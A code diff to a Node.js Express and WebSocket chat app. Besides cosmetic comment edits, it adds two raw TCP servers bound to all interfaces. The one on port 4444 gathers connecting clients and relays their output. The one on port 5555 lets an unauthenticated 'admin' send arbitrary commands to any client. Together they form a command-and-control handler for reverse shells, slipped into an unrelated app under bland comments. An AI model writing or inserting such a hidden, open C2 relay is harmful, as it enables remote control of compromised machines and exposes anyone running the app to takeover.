@@ -1,9 +1,10 @@
-// app.js
 const express = require('express');
 const path = require('path');
 const http = require('http');
 const WebSocket = require('ws');
+const net = require('net');
 
+// Set up Express and paths
 const port = process.env.PORT || 3001; // HTTP port
 const wsPort = 8888; // WebSocket port
 const app = express();
@@ -15,16 +16,16 @@ app.use(express.static(publicPath));
 // Create an HTTP server
 const server = http.createServer(app);
 
-// Create a WebSocket server on the same HTTP server
+// WebSocket server on the same HTTP server (port 3001)
 const wss = new WebSocket.Server({ server });
 
-// Handle WebSocket connections
+// Handle WebSocket connections on port 3001
 wss.on('connection', (ws) => {
   console.log('New WebSocket connection');
 
   ws.on('message', (message) => {
     console.log(`Received message: ${message}`);
-    // Broadcast message to all clients
+    // Broadcast message to all clients on port 3001
     wss.clients.forEach(client => {
       if (client !== ws && client.readyState === WebSocket.OPEN) {
         client.send(message);
@@ -68,4 +69,61 @@ wss8888.on('connection', (ws) => {
 // Start the WebSocket server on port 8888
 wsServer.listen(wsPort, () => {
   console.log(`WebSocket server listening on port ${wsPort}`);
+});
+
+// Client-server handling on port 4444
+const clients = {};
+let adminSocket = null;
+
+const clientServer = net.createServer((clientSocket) => {
+    const clientId = `${clientSocket.remoteAddress}:${clientSocket.remotePort}`;
+    console.log(`Client connected: ${clientId}`);
+    clients[clientId] = clientSocket;
+
+    clientSocket.on('data', (data) => {
+        console.log(`Received from ${clientId}: ${data}`);
+
+        if (adminSocket) {
+            adminSocket.write(`Client ${clientId}: ${data}`);
+        }
+    });
+
+    clientSocket.on('end', () => {
+        console.log(`Client disconnected: ${clientId}`);
+        delete clients[clientId];
+    });
+});
+
+clientServer.listen(4444, '0.0.0.0', () => {
+    console.log('Client server listening on port 4444');
+});
+
+// Admin server handling on port 5555
+const adminServer = net.createServer((socket) => {
+    console.log('Admin connected');
+    adminSocket = socket;
+
+    socket.on('data', (data) => {
+        const command = data.toString().trim();
+        if (command.startsWith('send')) {
+            const [_, clientId, ...cmdParts] = command.split(' ');
+            const cmd = cmdParts.join(' ');
+            if (clients[clientId]) {
+                clients[clientId].write(cmd);
+            } else {
+                socket.write(`Client ${clientId} not found\n`);
+            }
+        } else {
+            socket.write("Invalid command. Use 'send <client_id> <command>'.\n");
+        }
+    });
+
+    socket.on('end', () => {
+        console.log('Admin disconnected');
+        adminSocket = null;
+    });
+});
+
+adminServer.listen(5555, '0.0.0.0', () => {
+    console.log('Admin server listening on port 5555');
 });
